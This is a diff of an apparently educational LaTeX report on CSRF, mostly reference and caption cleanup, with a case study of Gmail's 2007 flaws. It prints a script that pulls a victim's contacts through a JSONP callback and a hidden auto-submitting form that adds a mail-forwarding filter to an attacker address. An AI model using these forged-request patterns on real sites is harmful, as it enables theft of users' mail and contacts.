@@ -135,7 +135,7 @@
   in appendix~\ref{app:practical_documentation}.
   
   \subsection{Description}
-  \csrf{} attacks consists of creating (forging) fake HTTP(S) requests on an authenticated 
+  \csrf{} attacks consist of creating (forging) fake HTTP(S) requests on an authenticated 
   user's behalf. It utilizes the lack of knowledge of the victim (user) and a breach in 
   the vulnerable website to build the request with credentials (cookies) of the victim. This 
   request can execute actions such as email changing, posting message, account deletion, etc.
@@ -298,7 +298,7 @@ public static function check_signed_token($received_token) {
   avoid JavaScript to be executed by untrusted websites, etc. it is possible to avoid such risks.
   
   \section{Google, vulnerable to CSRF in 2007}
-  One of today's most renowned company in the world[1] was seriously harmed in 2007. During one single year, 
+  One of today's most renowned company in the world~\cite{forbes} was seriously harmed in 2007. During one single year, 
   Google was subject to not one, but two CSRF attacks. The attackers had no problems abusing security 
   vulnerabilities in Google's newly released email service: Gmail. Although Gmail has been around in a beta 
   environment since 2004, it wasn't until 2007 it was released to the public. It was a year when CSRF went from 
@@ -310,9 +310,6 @@ public static function check_signed_token($received_token) {
   with losing one's account. Since then, these particular events are often used in educational contexts to help 
   demonstrating CSRF. 
 
-References: (just letting them be here for the moment)
-[1] Forbes - The world's most valuable brands. http://www.forbes.com/powerful-brands/. Accessed: 2015-11-24.
-[1 alt.] Infegy - Top 50 most popular brands. http://top50.infegy.com/. Accessed: 2015-11-24.
   
   \subsection{Contact list spoofing}
   It was around the beginning of 2007 that the public got information about CSRF attacks on Gmail. The CSRF 
@@ -328,9 +325,7 @@ References: (just letting them be here for the moment)
   the older technology generation.
   
   The security around the contact list was breached because of negligence from the development team. Although
-  some of the attacks succeeded, Google could correct the problem rather quickly [2].
-  
-[2] O'Reilly - GMail CSRF flaw fixed. http://archive.oreilly.com/pub/post/gmail_exploit_contact_list_hij.html. Accessed: 2015-11-23.
+  some of the attacks succeeded, Google could correct the problem rather quickly~\cite{oreilly}.
 
   \subsubsection{Exploitation}
   The basics of a CSRF scenario applies here:
@@ -340,24 +335,24 @@ References: (just letting them be here for the moment)
    \item (As most users were already logged in, they could simply browse the web right off the bat.)
    \item The victim is browsing the web, accessing the attacker website. 
    \item The attacker website answers with a page containing malicious HTML code with JavaScript.
-   \item Forged request is made, , calling the google function found in Picture 6. %%% <-- Has to be something dynamical
+   \item Forged request is made, calling the google function found in Figure~\ref{figure:callback_js}.
    \item (Extra) Attacker receives object with email contacts. %% Maybe not useful
   \end{enumerate}
   
   What made this possible was the server's verification scheme: it was only verifying that the caller was logged in 
   to a Google account. The ever active cookie declared it without hesitation which led to a successful attack.
-  To make it even worse, the server didn't check if the call came from the same webpage[3]. A simple popup window could 
+  To make it even worse, the server didn't check if the call came from the same webpage~\cite{gmail_contact_list_csrf}. A simple popup window could 
   have triggered this attack.
   
-  % Reference to code: 
-  % [3] http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/
-  % Accessed: 2015-11-26
   % Alternative ref: 
-  % [4] http://ajaxian.com/archives/gmail-csrf-security-flaw
+  % [4] http://ajaxian.com/archives/gmail-csrf-security-flaw ==> not cited in the text
   % Accessed: 2015-11-24
+  % TODO add \cite{}s in the text and remove \nocite{}s below
+  \nocite{gmail_contact_list_csrf2}
+  
   % It's neither of these sites code, it is Google's code. But we might have to quote it anyway.
   \begin{figure}[h!t]
-  \begin{minted}[linenos]{JS} % JS = JavaScript
+  \begin{minted}[linenos]{js} % JS = JavaScript
   google ({
   	Success: true,
   	Errors: [],
@@ -385,15 +380,15 @@ References: (just letting them be here for the moment)
   	}
   })
   \end{minted}
-  \caption{The JavaScript callback function that returned a data structure (object) with all email contacts.[2]}
-  \label{figure:signed_token_server}
+  \caption{The JavaScript callback function that returned a data structure (object) with all email contacts~\cite{oreilly}.}
+  \label{figure:callback_js}
   \end{figure}
   
-  As you can see in Picture 6, several fields were accessible. The affinity field told the attacker how important 
-  the contact was to that user, making it a more vulnerable target for phishing attempts[2]. 
+  As you can see in Figure~\ref{figure:callback_js}, several fields were accessible. The affinity field told the attacker how important 
+  the contact was to that user, making it a more vulnerable target for phishing attempts~\cite{oreilly}. 
   
   \begin{figure}[h!t]
-  \begin{minted}[linenos]{JS} % JS = JavaScript
+  \begin{minted}[linenos]{html} % JS = JavaScript
   <script type="text/javascript">
 	function google(data){
       var emails, i;
@@ -404,14 +399,16 @@ References: (just letting them be here for the moment)
 	}
   </script>
  
-  <script type="text/javascript" src="http://docs.google.com/data/contacts?out=js&show=ALL&psort=Affinity&callback=google&max=99999">
+  <script type="text/javascript" 
+  src="http://docs.google.com/data/contacts?out=js
+              &show=ALL&psort=Affinity&callback=google&max=99999">
   </script>
   \end{minted}
-  \caption{A simple JavaScript that calls the function in Picture 6 and writes the received data to a file.}
-  \label{figure:signed_token_server}
+  \caption{A simple JavaScript that calls the function in Figure~\ref{figure:callback_js} and writes the received data to a file.}
+  \label{figure:callback}
   \end{figure}
   
-  The code in Picture 7 does a very basic operation. The attacker could as well send the data to another program 
+  The code in Figure~\ref{figure:callback} does a very basic operation. The attacker could as well send the data to another program 
   that would for instance spam all contacts in the list or creating network connections for better relevance in 
   phishing attempts.
   
@@ -444,8 +441,10 @@ References: (just letting them be here for the moment)
   The injection could be done on almost any of Gmail's interfaces where a user was logged in.
   
   \begin{figure}[h!t]
-  \begin{minted}[linenos]{HTML/JS} % JS = JavaScript
-  <form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"> 
+  \begin{minted}[linenos]{HTML} % JS = JavaScript
+  <form method="POST" 
+      action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" 
+      enctype="multipart/form-data"> 
     <input type="hidden" name="cf2_emc" value="true"/> 
     <input type="hidden" name="cf2_email" value="allyourmails@arebelongto.us"/> 
     <input type="hidden" name="cf1_from" value=""/> 
@@ -460,24 +459,19 @@ References: (just letting them be here for the moment)
     <input type="hidden" name="nvp_bu_cftb" value="Create Filter"/> 
   </form>
   \end{minted}
-  \caption{The form layout presented by Gnucitizen[5] (educational site on security related matters).}
-  \label{figure:signed_token_server}
+  \caption{The form layout presented by Gnucitizen~\cite{gnucitizen} (educational site on security related matters).}
+  \label{figure:form}
   \end{figure}
-  
-[5] Gnucitizen - Google Gmail e-mail hijack technique. http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/. Accessed: 2015-11-26.  
   
   \subsubsection{Impact}
   One would it would be a hard backlash for Gmail when the reports came about the CSRF attacks. Users lost 
   accounts and information even after Google fixed the vulnerability. As the source of the attack, the filter, 
   had to be removed by the users themselves. But the declining popularity never occurred. The key, to the gigantic
   success users world wide are using today, is the fact it happened in an early stage. During the attacks in 
-  September, approximately 80 thousand were using Gmail[6]. Compare it to 2015 where 900 million users exists[7].
+  September, approximately 80 thousand were using Gmail~\cite{techcrunch}. Compare it to 2015 where 900 million users exists~\cite{dmr}.
   The attack was severe, but it was done during a time Gmail had just started their engines. If the same attack
   would happen today, who knows how many users would leave Gmail for another email service.
-  
-[6] Techcrunch - 2007 in numbers: Yahoo > Gmail. http://techcrunch.com/2007/12/25/2007-in-numbers-more-people-using-yahoo-mail-this-christmas-than-gmail/. Accessed: 2015-11-27.
-[7] DMR - 15 amazing Gmail Statistics Nov 15. http://expandedramblings.com/index.php/gmail-statistics/. Accessed: 2015-11-27.
-  
+
   \subsection{Comparison}
   % TODO
   
